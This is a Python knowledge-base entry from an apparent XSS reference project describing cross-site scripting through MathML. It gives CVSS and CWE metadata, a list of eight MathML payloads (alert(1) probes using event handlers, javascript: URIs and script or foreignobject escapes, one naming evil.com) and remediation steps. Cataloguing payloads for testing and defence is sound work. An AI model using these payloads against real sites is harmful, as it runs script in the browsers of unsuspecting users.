#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: MathML XSS Context
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via MathML",
    "severity": "high",
    "cvss_score": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "mathml", "math", "svg", "xml", "latex", "equations"],
    "description": """
MathML (Mathematical Markup Language) is used to display mathematical equations in browsers.
When user input is rendered as MathML without proper sanitization, XSS vulnerabilities can occur.
MathML can be embedded in HTML5 and SVG contexts.

SEVERITY: HIGH
MathML is often overlooked in sanitization. Many WAFs don't properly filter MathML payloads.
Commonly found in educational platforms, scientific applications, and documentation systems.
""",
    "attack_vector": """
BASIC MATHML XSS:
<math><maction actiontype="statusline#http://evil.com" xlink:href="javascript:alert(1)">CLICK</maction></math>

MSTYLE HANDLER:
<math><mstyle onmouseover=alert(1)>X</mstyle></math>

SEMANTICS TAG:
<math><semantics><annotation-xml encoding="application/xhtml+xml"><script>alert(1)</script></annotation-xml></semantics></math>

MGLYPH XSS:
<math><mglyph src=x onerror=alert(1)></math>

MERROR FALLBACK:
<math><merror><mtext><script>alert(1)</script></mtext></merror></math>

XLINK HREF:
<math xmlns="http://www.w3.org/1998/Math/MathML"><maction xlink:href="javascript:alert(1)">X</maction></math>

MSPACE ATTRIBUTE:
<math><mspace width="100" height=alert(1)></math>

FOREIGNOBJECT ESCAPE:
<math><mtext><foreignobject><body onload=alert(1)></foreignobject></mtext></math>
""",
    "remediation": """
DEFENSE:

1. SANITIZE MathML with whitelist approach
2. Remove all event handlers from MathML elements
3. Strip xlink:href and javascript: URIs
4. Disallow foreignObject in MathML
5. Use MathJax or KaTeX for safe rendering
6. Implement strict CSP
7. Consider server-side rendering to images

SAFE LIBRARIES:
- MathJax: Renders LaTeX/MathML safely
- KaTeX: Fast math typesetting
- Render math server-side as PNG/SVG

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- SVG Security Guidelines
""",
}
